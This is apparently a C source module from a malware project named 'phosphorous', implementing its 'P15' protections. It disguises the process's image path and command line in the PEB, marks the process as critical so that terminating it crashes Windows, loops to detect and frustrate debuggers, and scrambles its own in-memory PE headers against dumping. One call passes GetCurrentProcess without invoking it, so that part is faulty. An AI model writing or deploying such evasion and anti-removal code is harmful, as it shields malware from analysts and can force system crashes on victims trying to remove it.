#include "phosphorous.h"
#include <winternl.h>

VOID CorruptPEBInfo() {
	LPCWSTR lpMessage = L"Exit light, enter night. Take my hand, we're off to never-neverland";
	DWORD dwMessageLen = lstrlenW(lpMessage);
	PPEB lpPEB = __readfsdword(0x30);
	PLDR_DATA_TABLE_ENTRY lpDatableEntry = 
		CONTAINING_RECORD(lpPEB->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink);
	SetCurrentDirectoryW(L"C:\\Windows");
	lpPEB->ProcessParameters->ImagePathName.Buffer =
		lpDatableEntry->FullDllName.Buffer =
		lpPEB->ProcessParameters->CommandLine.Buffer = lpMessage;
		
	lpPEB->ProcessParameters->ImagePathName.Length =
		lpPEB->ProcessParameters->ImagePathName.MaximumLength =
		lpPEB->ProcessParameters->CommandLine.Length =
		lpDatableEntry->FullDllName.Length =
		lpDatableEntry->FullDllName.MaximumLength =
		lpPEB->ProcessParameters->CommandLine.MaximumLength = dwMessageLen;
	
	lpDatableEntry->TimeDateStamp = 0x444F5241;
}

VOID MakeBreakOnTermination(LPDLLSTRUCT dll) {
	DWORD dwBreakOnTermination = 1;
	dll->NtSetInformationProcess(GetCurrentProcess, ProcessBreakOnTermination, &dwBreakOnTermination, sizeof(DWORD));
}

VOID CorruptPEHeaders() {
	DWORD dwTrash, dwPEHeaderSize;
	PIMAGE_DOS_HEADER lpDosHeader = GetModuleHandleW(NULL); //Base Address = GetModuleHandle(NULL)[
	PIMAGE_NT_HEADERS lpNTHeader;
	lpNTHeader = (PIMAGE_NT_HEADERS)((CHAR*)lpDosHeader->e_lfanew + (ULONG_PTR)lpDosHeader);
	dwPEHeaderSize = sizeof(*lpDosHeader) + sizeof(lpNTHeader->FileHeader) + sizeof(lpNTHeader->OptionalHeader) + sizeof(lpNTHeader->Signature);
	VirtualProtect(lpDosHeader, dwPEHeaderSize, PAGE_EXECUTE_READWRITE, &dwTrash);
	lpDosHeader->e_magic = xorshift() >> 16;
	lpNTHeader->FileHeader.Machine = 0;
	//lpNTHeader->OptionalHeader.BaseOfCode = xorshift();
	//lpNTHeader->OptionalHeader.BaseOfData = xorshift();
	lpNTHeader->OptionalHeader.Magic = xorshift();
	//lpNTHeader->OptionalHeader.SectionAlignment = xorshift();
	//lmemset(&(lpNTHeader->OptionalHeader.SizeOfCode), 0, sizeof(DWORD) * 6);
	lmemset(&(lpNTHeader->OptionalHeader.MajorOperatingSystemVersion), 0, sizeof(WORD) * 8);
}

DWORD WINAPI AntiDebug(LPDLLSTRUCT dll) {
	DLLSTRUCT locdll = *dll;
	DWORD dwBrOnT = 1, dwRandom;
	PPEB lpPeb = __readfsdword(0x30);
	for (;;) {
		locdll.NtSetInformationProcess(GetCurrentProcess(),ProcessBreakOnTermination, &dwBrOnT, sizeof(DWORD));
		dwRandom = xorshift();
		locdll.NtSetInformationProcess(GetCurrentProcess(), ProcessDebugPort, &dwRandom, sizeof(DWORD));
		if (lpPeb->BeingDebugged) ExitProcess(0x74776174);
		Sleep(1000);
	}
}



//Returns handle to the AntiDebug thread 
HANDLE EnableAllP15Protections(LPDLLSTRUCT dll) {
	HANDLE hAntiDebug = mkthreadp(AntiDebug, 0, dll); 
	MakeBreakOnTermination(dll);
	//SetThreadPriority(hAntiDebug, THREAD_PRIORITY_HIGHEST); //borked [[[[[[[[
	//CorruptPEHeaders();
	//CorruptPEBInfo();
	return hAntiDebug;
}